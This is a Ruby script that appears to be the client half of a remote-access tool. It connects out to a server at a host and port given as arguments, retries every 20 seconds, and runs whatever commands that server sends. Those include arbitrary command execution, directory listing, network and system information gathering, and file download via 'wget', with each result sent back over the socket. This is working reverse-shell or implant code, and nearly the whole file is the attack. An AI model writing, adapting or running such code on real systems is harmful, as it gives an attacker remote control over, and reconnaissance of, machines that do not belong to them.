#!/usr/bin/env ruby

require_relative "helpers.rb"

def handle_client(client)
  loop do
    result = ''
    data = client.recv(1024)
    next if data.nil?
    cmd, action = data.split ' '
    case cmd
    when 'exe'
      begin
        result = Helpers.exe(data.gsub('exe ', ''))
      rescue Exception => e
        puts e.message
      end
    when 'ls'
      result = Helpers.ls
    when 'pwd'
      result = Helpers.pwd
    when 'pid'
      result = Helpers.pid
    when 'ifconfig'
      result = Helpers.ifconfig
    when 'sysinfo'
      result = Helpers.sysinfo
    when 'wget'
      result = wget(action)
    end

    result = result.to_s
    client.puts(result.length)
    client.write(result)
  end
end


def main(timeout)
  host = ARGV[0]
  port = ARGV[1]

  # If host/port is not passed in ARGV, default to localhost:3000
  host ||= "localhost"
  port ||= 3000

  status = 0

  # Main loop around handle_client loop to repeat attempt server connection
  loop do
    client = nil
    begin
      client = TCPSocket.new(host, port)
    rescue Errno::ECONNRESET, Errno::ECONNRESET => e
      puts e.backtrace.join("\n")
      sleep(timeout)
    end

    begin
      status = handle_client(client)
    rescue Interrupt
      exit 0
    rescue Exception => e
      puts e.to_s
      puts e.backtrace.join("\n")
      next
    end

    if status
      exit 0
    end
  end
end

TIMEOUT = 20
main(TIMEOUT)
